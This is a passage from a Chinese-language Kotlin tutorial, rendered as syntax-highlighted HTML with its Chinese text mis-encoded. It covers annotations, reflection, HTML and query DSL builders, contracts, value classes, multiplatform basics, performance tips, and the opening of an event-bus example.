<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// å®šä¹‰æ³¨è§£</span>
<span class="hljs-variable">@Target</span>(AnnotationTarget.CLASS, AnnotationTarget.FUNCTION)
<span class="hljs-variable">@Retention</span>(AnnotationRetention.RUNTIME)
annotation class <span class="hljs-built_in">ApiVersion</span>(val <span class="hljs-attribute">version</span>: String)

<span class="hljs-variable">@Target</span>(AnnotationTarget.PROPERTY)
annotation class JsonExclude

<span class="hljs-variable">@Target</span>(AnnotationTarget.PROPERTY)
annotation class <span class="hljs-built_in">JsonName</span>(val <span class="hljs-attribute">name</span>: String)

<span class="hljs-comment">// ä½¿ç”¨æ³¨è§£</span>
<span class="hljs-variable">@ApiVersion</span>(<span class="hljs-string">"1.0"</span>)
data class <span class="hljs-built_in">User</span>(
    <span class="hljs-variable">@JsonName</span>(<span class="hljs-string">"user_name"</span>)
    val <span class="hljs-attribute">name</span>: String,
    
    val <span class="hljs-attribute">age</span>: Int,
    
    <span class="hljs-variable">@JsonExclude</span>
    val <span class="hljs-attribute">password</span>: String
)

<span class="hljs-comment">// æ³¨è§£å¤„ç†å™¨æ¨¡æ‹Ÿ</span>
fun <span class="hljs-built_in">processAnnotations</span>(<span class="hljs-attribute">obj</span>: Any) {
    <span class="hljs-selector-tag">val</span> <span class="hljs-selector-tag">klass</span> = <span class="hljs-selector-tag">obj</span>::<span class="hljs-selector-tag">class</span>
    <span class="hljs-selector-tag">val</span> <span class="hljs-selector-tag">apiVersion</span> = <span class="hljs-selector-tag">klass</span><span class="hljs-selector-class">.annotations</span><span class="hljs-selector-class">.find</span> { <span class="hljs-selector-tag">it</span> <span class="hljs-selector-tag">is</span> <span class="hljs-selector-tag">ApiVersion</span> } <span class="hljs-selector-tag">as</span>? <span class="hljs-selector-tag">ApiVersion</span>
    <span class="hljs-selector-tag">apiVersion</span>?<span class="hljs-selector-class">.let</span> { <span class="hljs-selector-tag">println</span>(<span class="hljs-string">"API ç‰ˆæœ¬: ${it.version}"</span>) }
    
    <span class="hljs-selector-tag">klass</span><span class="hljs-selector-class">.memberProperties</span><span class="hljs-selector-class">.forEach</span> { <span class="hljs-selector-tag">prop</span> <span class="hljs-selector-tag">-</span>&gt;
        <span class="hljs-selector-tag">prop</span><span class="hljs-selector-class">.annotations</span><span class="hljs-selector-class">.forEach</span> { <span class="hljs-selector-tag">annotation</span> <span class="hljs-selector-tag">-</span>&gt;
            <span class="hljs-keyword">when</span> (annotation) {
                <span class="hljs-selector-tag">is</span> <span class="hljs-selector-tag">JsonName</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">println</span>(<span class="hljs-string">"å±æ€§ ${prop.name} å°†è¢«åºåˆ—åŒ–ä¸º ${annotation.name}"</span>)
                <span class="hljs-selector-tag">is</span> <span class="hljs-selector-tag">JsonExclude</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">println</span>(<span class="hljs-string">"å±æ€§ ${prop.name} å°†è¢«æ’é™¤"</span>)
            }
        }
    }
}
</code></pre>
<h5 data-id="heading-6"><strong>2. åå°„å®æˆ˜</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> kotlin.reflect.full.*
<span class="hljs-keyword">import</span> kotlin.reflect.jvm.isAccessible

<span class="hljs-keyword">class</span> <span class="hljs-title class_">SecretClass</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> secretValue = <span class="hljs-string">"æœºå¯†ä¿¡æ¯"</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">secretMethod</span><span class="hljs-params">()</span></span> = <span class="hljs-string">"æœºå¯†æ–¹æ³•"</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">publicMethod</span><span class="hljs-params">()</span></span> = <span class="hljs-string">"å…¬å¼€æ–¹æ³•"</span>
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">reflectExample</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> instance = SecretClass()
    <span class="hljs-keyword">val</span> klass = instance::<span class="hljs-keyword">class</span>
    
    <span class="hljs-title class_">println</span>(<span class="hljs-string">"=== ç±»ä¿¡æ¯ ==="</span>)
    println(<span class="hljs-string">"ç±»å: <span class="hljs-subst">${klass.simpleName}</span>"</span>)
    println(<span class="hljs-string">"æˆå‘˜å±æ€§: <span class="hljs-subst">${klass.memberProperties.map { it.name }</span>}"</span>)
    println(<span class="hljs-string">"æˆå‘˜å‡½æ•°: <span class="hljs-subst">${klass.memberFunctions.map { it.name }</span>}"</span>)
    
    println(<span class="hljs-string">"\n=== è®¿é—®ç§æœ‰æˆå‘˜ ==="</span>)
    <span class="hljs-comment">// è®¿é—®ç§æœ‰å±æ€§</span>
    <span class="hljs-keyword">val</span> secretProperty = klass.memberProperties.find { it.name == <span class="hljs-string">"secretValue"</span> }
    secretProperty?.let {
        it.isAccessible = <span class="hljs-literal">true</span>
        println(<span class="hljs-string">"ç§æœ‰å±æ€§å€¼: <span class="hljs-subst">${it.get(instance)}</span>"</span>)
    }
    
    <span class="hljs-comment">// è°ƒç”¨ç§æœ‰æ–¹æ³•</span>
    <span class="hljs-keyword">val</span> secretMethod = klass.memberFunctions.find { it.name == <span class="hljs-string">"secretMethod"</span> }
    secretMethod?.let {
        it.isAccessible = <span class="hljs-literal">true</span>
        println(<span class="hljs-string">"ç§æœ‰æ–¹æ³•ç»“æœ: <span class="hljs-subst">${it.call(instance)}</span>"</span>)
    }
}
</code></pre>
<h4 data-id="heading-7"><strong>ä¸‰åå››ã€ç±»å‹å®‰å…¨çš„æ„å»ºå™¨ï¼ˆDSLï¼‰</strong></h4>
<h5 data-id="heading-8"><strong>1. HTML DSL æ„å»ºå™¨</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HtmlElement</span>(<span class="hljs-keyword">val</span> name: String, <span class="hljs-keyword">val</span> content: String = <span class="hljs-string">""</span>) {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> children = mutableListOf&lt;HtmlElement&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> attributes = mutableMapOf&lt;String, String&gt;()
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">attribute</span><span class="hljs-params">(name: <span class="hljs-type">String</span>, value: <span class="hljs-type">String</span>)</span></span> {
        attributes[name] = value
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">child</span><span class="hljs-params">(element: <span class="hljs-type">HtmlElement</span>)</span></span> {
        children.add(element)
    }
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">toString</span><span class="hljs-params">()</span></span>: String {
        <span class="hljs-keyword">val</span> attrString = <span class="hljs-keyword">if</span> (attributes.isNotEmpty()) {
            <span class="hljs-string">" "</span> + attributes.entries.joinToString(<span class="hljs-string">" "</span>) { <span class="hljs-string">"<span class="hljs-subst">${it.key}</span>="</span>${it.value}<span class="hljs-string">""</span> }
        } <span class="hljs-keyword">else</span> <span class="hljs-string">""</span>
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (children.isEmpty()) {
            <span class="hljs-string">"&lt;<span class="hljs-variable">$name</span><span class="hljs-variable">$attrString</span>&gt;<span class="hljs-variable">$content</span>&lt;/<span class="hljs-variable">$name</span>&gt;"</span>
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-string">"&lt;<span class="hljs-variable">$name</span><span class="hljs-variable">$attrString</span>&gt;<span class="hljs-subst">${children.joinToString(<span class="hljs-string">""</span>)}</span><span class="hljs-variable">$content</span>&lt;/<span class="hljs-variable">$name</span>&gt;"</span>
        }
    }
}

<span class="hljs-comment">// DSL æ„å»ºå‡½æ•°</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">html</span><span class="hljs-params">(block: <span class="hljs-type">HtmlBuilder</span>.() -&gt; <span class="hljs-type">Unit</span>)</span></span>: HtmlElement {
    <span class="hljs-keyword">val</span> builder = HtmlBuilder(<span class="hljs-string">"html"</span>)
    builder.block()
    <span class="hljs-keyword">return</span> builder.build()
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">HtmlBuilder</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> rootName: String) {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> root = HtmlElement(rootName)
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> currentElement: HtmlElement = root
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">head</span><span class="hljs-params">(block: <span class="hljs-type">HeadBuilder</span>.() -&gt; <span class="hljs-type">Unit</span>)</span></span> {
        <span class="hljs-keyword">val</span> headBuilder = HeadBuilder()
        headBuilder.block()
        root.child(headBuilder.build())
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">body</span><span class="hljs-params">(block: <span class="hljs-type">BodyBuilder</span>.() -&gt; <span class="hljs-type">Unit</span>)</span></span> {
        <span class="hljs-keyword">val</span> bodyBuilder = BodyBuilder()
        bodyBuilder.block()
        root.child(bodyBuilder.build())
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">build</span><span class="hljs-params">()</span></span>: HtmlElement = root
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">HeadBuilder</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> head = HtmlElement(<span class="hljs-string">"head"</span>)
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">title</span><span class="hljs-params">(text: <span class="hljs-type">String</span>)</span></span> {
        head.child(HtmlElement(<span class="hljs-string">"title"</span>, text))
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">build</span><span class="hljs-params">()</span></span>: HtmlElement = head
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">BodyBuilder</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> body = HtmlElement(<span class="hljs-string">"body"</span>)
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">h1</span><span class="hljs-params">(text: <span class="hljs-type">String</span>, block: <span class="hljs-type">H1Builder</span>.() -&gt; <span class="hljs-type">Unit</span> = {})</span></span> {
        <span class="hljs-keyword">val</span> h1Builder = H1Builder(text)
        h1Builder.block()
        body.child(h1Builder.build())
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">p</span><span class="hljs-params">(text: <span class="hljs-type">String</span>)</span></span> {
        body.child(HtmlElement(<span class="hljs-string">"p"</span>, text))
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">build</span><span class="hljs-params">()</span></span>: HtmlElement = body
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">H1Builder</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> text: String) {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> h1 = HtmlElement(<span class="hljs-string">"h1"</span>, text)
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">style</span><span class="hljs-params">(css: <span class="hljs-type">String</span>)</span></span> {
        h1.attribute(<span class="hljs-string">"style"</span>, css)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">build</span><span class="hljs-params">()</span></span>: HtmlElement = h1
}

<span class="hljs-comment">// ä½¿ç”¨ DSL</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createHtmlPage</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> page = html {
        head {
            title(<span class="hljs-string">"æˆ‘çš„ç½‘é¡µ"</span>)
        }
        body {
            h1(<span class="hljs-string">"æ¬¢è¿æ¥åˆ° Kotlin DSL"</span>) {
                style(<span class="hljs-string">"color: blue;"</span>)
            }
            p(<span class="hljs-string">"è¿™æ˜¯ä¸€ä¸ªä½¿ç”¨ DSL æ„å»ºçš„ HTML é¡µé¢"</span>)
        }
    }
    
    println(page)
}
</code></pre>
<h5 data-id="heading-9"><strong>2. æ•°æ®åº“æŸ¥è¯¢ DSL</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// æŸ¥è¯¢ DSL å®šä¹‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">QueryBuilder</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> table: String = <span class="hljs-string">""</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> conditions = mutableListOf&lt;String&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> limit: <span class="hljs-built_in">Int</span>? = <span class="hljs-literal">null</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> orderBy: String? = <span class="hljs-literal">null</span>
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">from</span><span class="hljs-params">(table: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-keyword">this</span>.table = table
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">where</span><span class="hljs-params">(condition: <span class="hljs-type">String</span>)</span></span> {
        conditions.add(condition)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">limit</span><span class="hljs-params">(count: <span class="hljs-type">Int</span>)</span></span> {
        <span class="hljs-keyword">this</span>.limit = count
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">orderBy</span><span class="hljs-params">(column: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-keyword">this</span>.orderBy = column
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">build</span><span class="hljs-params">()</span></span>: String {
        <span class="hljs-keyword">val</span> query = StringBuilder(<span class="hljs-string">"SELECT * FROM <span class="hljs-variable">$table</span>"</span>)
        
        <span class="hljs-keyword">if</span> (conditions.isNotEmpty()) {
            query.append(<span class="hljs-string">" WHERE "</span>).append(conditions.joinToString(<span class="hljs-string">" AND "</span>))
        }
        
        orderBy?.let {
            query.append(<span class="hljs-string">" ORDER BY <span class="hljs-variable">$it</span>"</span>)
        }
        
        limit?.let {
            query.append(<span class="hljs-string">" LIMIT <span class="hljs-variable">$it</span>"</span>)
        }
        
        <span class="hljs-keyword">return</span> query.toString()
    }
}

<span class="hljs-comment">// DSL å…¥å£å‡½æ•°</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">query</span><span class="hljs-params">(block: <span class="hljs-type">QueryBuilder</span>.() -&gt; <span class="hljs-type">Unit</span>)</span></span>: String {
    <span class="hljs-keyword">val</span> builder = QueryBuilder()
    builder.block()
    <span class="hljs-keyword">return</span> builder.build()
}

<span class="hljs-comment">// ä½¿ç”¨ DSL æ„å»ºæŸ¥è¯¢</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">buildQueries</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> simpleQuery = query {
        from(<span class="hljs-string">"users"</span>)
    }
    println(<span class="hljs-string">"ç®€å•æŸ¥è¯¢: <span class="hljs-variable">$simpleQuery</span>"</span>)
    
    <span class="hljs-keyword">val</span> complexQuery = query {
        from(<span class="hljs-string">"orders"</span>)
        <span class="hljs-keyword">where</span>(<span class="hljs-string">"status = 'completed'"</span>)
        <span class="hljs-keyword">where</span>(<span class="hljs-string">"amount &gt; 100"</span>)
        orderBy(<span class="hljs-string">"created_at DESC"</span>)
        limit(<span class="hljs-number">10</span>)
    }
    println(<span class="hljs-string">"å¤æ‚æŸ¥è¯¢: <span class="hljs-variable">$complexQuery</span>"</span>)
}
</code></pre>
<h4 data-id="heading-10"><strong>ä¸‰åäº”ã€åˆçº¦ï¼ˆContractsï¼‰ä¸å†…è”ä¼˜åŒ–</strong></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> kotlin.contracts.*

<span class="hljs-comment">// ä½¿ç”¨åˆçº¦ä¼˜åŒ–æ™ºèƒ½è½¬æ¢</span>
<span class="hljs-meta">@OptIn(ExperimentalContracts::class)</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> String?.<span class="hljs-title">isNotNullOrEmpty</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
    contract {
        returns(<span class="hljs-literal">true</span>) implies (<span class="hljs-keyword">this</span><span class="hljs-symbol">@isNotNullOrEmpty</span> != <span class="hljs-literal">null</span>)
    }
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span> != <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-keyword">this</span>.isNotEmpty()
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">processText</span><span class="hljs-params">(text: <span class="hljs-type">String</span>?)</span></span> {
    <span class="hljs-keyword">if</span> (text.isNotNullOrEmpty()) {
        <span class="hljs-comment">// ç”±äºåˆçº¦ï¼Œç¼–è¯‘å™¨çŸ¥é“ text ä¸ä¸º null</span>
        println(text.length) <span class="hljs-comment">// ä¸éœ€è¦å®‰å…¨è°ƒç”¨</span>
        println(text.uppercase())
    }
}

<span class="hljs-comment">// å†…è”ç±» - åŒ…è£…ç±»å‹è€Œä¸äº§ç”Ÿè¿è¡Œæ—¶å¼€é”€</span>
<span class="hljs-meta">@JvmInline</span>
value <span class="hljs-keyword">class</span> <span class="hljs-title class_">Password</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> value: String) {
    <span class="hljs-keyword">init</span> {
        require(value.length &gt;= <span class="hljs-number">8</span>) { <span class="hljs-string">"å¯†ç å¿…é¡»è‡³å°‘8ä¸ªå­—ç¬¦"</span> }
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">mask</span><span class="hljs-params">()</span></span>: String = <span class="hljs-string">"*"</span>.repeat(value.length)
}

<span class="hljs-meta">@JvmInline</span>
value <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserId</span>(<span class="hljs-keyword">val</span> value: <span class="hljs-built_in">Int</span>)

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">login</span><span class="hljs-params">(userId: <span class="hljs-type">UserId</span>, password: <span class="hljs-type">Password</span>)</span></span> {
    println(<span class="hljs-string">"ç”¨æˆ· <span class="hljs-subst">${userId.value}</span> ç™»å½•ï¼Œå¯†ç : <span class="hljs-subst">${password.mask()}</span>"</span>)
}
</code></pre>
<h4 data-id="heading-11"><strong>ä¸‰åå…­ã€å¤šå¹³å°é¡¹ç›®ï¼ˆKMPï¼‰åŸºç¡€</strong></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// å…¬å…±æ¨¡å— - å…±äº«ä¸šåŠ¡é€»è¾‘</span>
<span class="hljs-keyword">expect</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Platform</span>() {
    <span class="hljs-keyword">val</span> platform: String
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Greeting</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> platform = Platform()
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">greet</span><span class="hljs-params">()</span></span>: String {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Hello from <span class="hljs-subst">${platform.platform}</span>"</span>
    }
}

<span class="hljs-comment">// Android å®ç°</span>
<span class="hljs-comment">// androidMain/Platform.kt</span>
<span class="hljs-keyword">actual</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Platform</span> <span class="hljs-title">actual</span> <span class="hljs-keyword">constructor</span>() {
    <span class="hljs-keyword">actual</span> <span class="hljs-keyword">val</span> platform: String = <span class="hljs-string">"Android"</span>
}

<span class="hljs-comment">// iOS å®ç°  </span>
<span class="hljs-comment">// iosMain/Platform.kt</span>
<span class="hljs-keyword">actual</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Platform</span> <span class="hljs-title">actual</span> <span class="hljs-keyword">constructor</span>() {
    <span class="hljs-keyword">actual</span> <span class="hljs-keyword">val</span> platform: String = <span class="hljs-string">"iOS"</span>
}

<span class="hljs-comment">// å…±äº«ä¸šåŠ¡é€»è¾‘</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">add</span><span class="hljs-params">(a: <span class="hljs-type">Int</span>, b: <span class="hljs-type">Int</span>)</span></span>: <span class="hljs-built_in">Int</span> = a + b
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">multiply</span><span class="hljs-params">(a: <span class="hljs-type">Int</span>, b: <span class="hljs-type">Int</span>)</span></span>: <span class="hljs-built_in">Int</span> = a * b
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">calculateExpression</span><span class="hljs-params">(expression: <span class="hljs-type">String</span>)</span></span>: <span class="hljs-built_in">Int</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> {
            expression.contains(<span class="hljs-string">"+"</span>) -&gt; {
                <span class="hljs-keyword">val</span> parts = expression.split(<span class="hljs-string">"+"</span>)
                add(parts[<span class="hljs-number">0</span>].trim().toInt(), parts[<span class="hljs-number">1</span>].trim().toInt())
            }
            expression.contains(<span class="hljs-string">"*"</span>) -&gt; {
                <span class="hljs-keyword">val</span> parts = expression.split(<span class="hljs-string">"*"</span>)
                multiply(parts[<span class="hljs-number">0</span>].trim().toInt(), parts[<span class="hljs-number">1</span>].trim().toInt())
            }
            <span class="hljs-keyword">else</span> -&gt; <span class="hljs-keyword">throw</span> IllegalArgumentException(<span class="hljs-string">"ä¸æ”¯æŒçš„è¡¨è¾¾å¼"</span>)
        }
    }
}
</code></pre>
<h4 data-id="heading-12"><strong>ä¸‰åä¸ƒã€æ€§èƒ½ä¼˜åŒ–ä¸æœ€ä½³å®è·µ</strong></h4>
<h5 data-id="heading-13"><strong>1. é›†åˆæ“ä½œä¼˜åŒ–</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">collectionOptimization</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> numbers = (<span class="hljs-number">1.</span><span class="hljs-number">.1000000</span>).toList()
    
    <span class="hljs-comment">// ä¸å¥½çš„å†™æ³•ï¼šå¤šæ¬¡ä¸­é—´æ“ä½œ</span>
    <span class="hljs-keyword">val</span> badResult = numbers
        .filter { it % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> }
        .map { it * <span class="hljs-number">2</span> }
        .filter { it &gt; <span class="hljs-number">1000</span> }
        .take(<span class="hljs-number">10</span>)
    
    <span class="hljs-comment">// å¥½çš„å†™æ³•ï¼šä½¿ç”¨åºåˆ—ï¼ˆæƒ°æ€§æ±‚å€¼ï¼‰</span>
    <span class="hljs-keyword">val</span> goodResult = numbers.asSequence()
        .filter { it % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> }
        .map { it * <span class="hljs-number">2</span> }
        .filter { it &gt; <span class="hljs-number">1000</span> }
        .take(<span class="hljs-number">10</span>)
        .toList()
    
    println(<span class="hljs-string">"ç»“æœ: <span class="hljs-variable">$goodResult</span>"</span>)
}

<span class="hljs-comment">// ä½¿ç”¨ groupBy ä¼˜åŒ–å¤æ‚æ“ä½œ</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(<span class="hljs-keyword">val</span> name: String, <span class="hljs-keyword">val</span> age: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">val</span> city: String)

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">optimizeGrouping</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> people = listOf(
        Person(<span class="hljs-string">"Alice"</span>, <span class="hljs-number">25</span>, <span class="hljs-string">"Beijing"</span>),
        Person(<span class="hljs-string">"Bob"</span>, <span class="hljs-number">30</span>, <span class="hljs-string">"Shanghai"</span>),
        Person(<span class="hljs-string">"Charlie"</span>, <span class="hljs-number">25</span>, <span class="hljs-string">"Beijing"</span>),
        Person(<span class="hljs-string">"Diana"</span>, <span class="hljs-number">30</span>, <span class="hljs-string">"Shanghai"</span>)
    )
    
    <span class="hljs-comment">// æŒ‰åŸå¸‚åˆ†ç»„ï¼Œç„¶åæŒ‰å¹´é¾„åˆ†ç»„</span>
    <span class="hljs-keyword">val</span> grouped = people.groupBy({ it.city }, { it.age })
    println(<span class="hljs-string">"åˆ†ç»„ç»“æœ: <span class="hljs-variable">$grouped</span>"</span>)
    
    <span class="hljs-comment">// ç»Ÿè®¡æ¯ä¸ªåŸå¸‚çš„å¹³å‡å¹´é¾„</span>
    <span class="hljs-keyword">val</span> averageAges = people.groupingBy { it.city }
        .fold(<span class="hljs-number">0.0</span>) { accumulator, element -&gt; 
            accumulator + element.age 
        }.mapValues { it.value / people.count { p -&gt; p.city == it.key } }
    
    println(<span class="hljs-string">"å¹³å‡å¹´é¾„: <span class="hljs-variable">$averageAges</span>"</span>)
}
</code></pre>
<h5 data-id="heading-14"><strong>2. å†…å­˜ä¼˜åŒ–æ¨¡å¼</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ä½¿ç”¨å¯¹è±¡æ± é¿å…é‡å¤åˆ›å»º</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ConnectionPool</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">constructor</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> available = mutableListOf&lt;Connection&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> inUse = mutableSetOf&lt;Connection&gt;()
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getConnection</span><span class="hljs-params">()</span></span>: Connection {
        <span class="hljs-keyword">return</span> available.removeFirstOrNull()?.also { inUse.add(it) } 
            ?: Connection().also { inUse.add(it) }
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">releaseConnection</span><span class="hljs-params">(connection: <span class="hljs-type">Connection</span>)</span></span> {
        inUse.remove(connection)
        available.add(connection)
    }
    
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-keyword">val</span> instance <span class="hljs-keyword">by</span> lazy { ConnectionPool() }
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Connection</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">connect</span><span class="hljs-params">()</span></span> = println(<span class="hljs-string">"è¿æ¥å»ºç«‹"</span>)
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">disconnect</span><span class="hljs-params">()</span></span> = println(<span class="hljs-string">"è¿æ¥å…³é—­"</span>)
}

<span class="hljs-comment">// ä½¿ç”¨ use å‡½æ•°è‡ªåŠ¨ç®¡ç†èµ„æº</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">readFileSafely</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// æ¨¡æ‹Ÿèµ„æºç®¡ç†</span>
    <span class="hljs-keyword">val</span> resource = <span class="hljs-keyword">object</span> : AutoCloseable {
        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">close</span><span class="hljs-params">()</span></span> = println(<span class="hljs-string">"èµ„æºå·²é‡Šæ”¾"</span>)
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">read</span><span class="hljs-params">()</span></span> = <span class="hljs-string">"æ–‡ä»¶å†…å®¹"</span>
    }
    
    <span class="hljs-keyword">val</span> content = resource.use { 
        it.read() 
    }
    println(<span class="hljs-string">"å†…å®¹: <span class="hljs-variable">$content</span>"</span>) <span class="hljs-comment">// èµ„æºä¼šè‡ªåŠ¨å…³é—­</span>
}
</code></pre>
<h4 data-id="heading-15"><strong>ä¸‰åå…«ã€å®Œæ•´å®æˆ˜é¡¹ç›®ï¼šæ„å»ºäº‹ä»¶æ€»çº¿ç³»ç»Ÿ</strong></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> kotlinx.coroutines.*
<span class="hljs-keyword">import</span> kotlinx.coroutines.channels.*
<span class="hljs-keyword">import</span> kotlinx.coroutines.flow.*
<span class="hljs-keyword">import</span> kotlin.reflect.KClass

<span class="hljs-comment">// äº‹ä»¶åŸºç±»</span>
<span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Event</span> {
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserLoggedIn</span>(<span class="hljs-keyword">val</span> userId: String) : Event()
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCreated</span>(<span class="hljs-keyword">val</span> orderId: String, <span class="hljs-keyword">val</span> amount: <span class="hljs-built_in">Double</span>) : Event()
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PaymentProcessed</span>(<span class="hljs-keyword">val</span> paymentId: String, <span class="hljs-keyword">val</span> success: <span class="hljs-built_in">Boolean</span>) : Event()
    <span class="hljs-keyword">object</span> SystemShutdown : Event()
}

<span class="hljs-comment">// äº‹ä»¶å¤„ç†å™¨æ¥å£</span>
